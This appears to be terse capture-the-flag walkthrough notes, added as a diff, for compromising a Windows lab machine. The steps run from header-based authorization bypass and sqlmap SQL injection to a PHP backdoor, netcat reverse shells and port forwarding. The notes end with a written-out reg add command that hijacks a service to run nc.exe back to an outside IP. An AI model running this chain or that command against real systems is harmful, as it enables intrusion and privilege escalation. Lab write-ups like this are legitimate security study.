@@ -1,0 +1,18 @@
+nmap -->> port 80 -->> view-source -->> internal IP
+admin panel -->> access denied with host -->> X-Forwarded-For with internal IP to bypass authorization
+search field -->> error-based sql injection -->> sqlmap with post-request data -->> db mysql -->> hashes found
+cracking hashes -->> user creds for two users
+sqlmap -->> uploading php one-liner backdoor in webroot and nc.exe
+backdoor -->> nc.exe with listener running -->> shell catched -->> running powershell
+netstat to list connections -->> 5985 (rm) running locally -->> powershell invoke-webrequest to download plink.exe -->> port-forwarding*
+evil-winrm using hector -->> on localhost and forwarded port -->> user.txt
+check the permissions in powershell history -->> permissions to edit services through registry**
+list all services using a ps1 script -->> windows update assistant service stopped but can be started by hector
+use reg add to configure the service and incorporate an nc command in it*** -->> start the service
+admin shell received -->> unstable -->> use nc to create another admin shell -->> stable -->> root.txt
+
+
+
+*blog: https://null-byte.wonderhowto.com/how-to/use-remote-port-forwarding-slip-past-firewall-restrictions-unnoticed-0179716/
+**blog: http://woshub.com/powershell-commands-history/
+***command: reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\windows\system32\spool\drivers\color\nc.exe 10.10.15.95 9999 -e cmd" /f
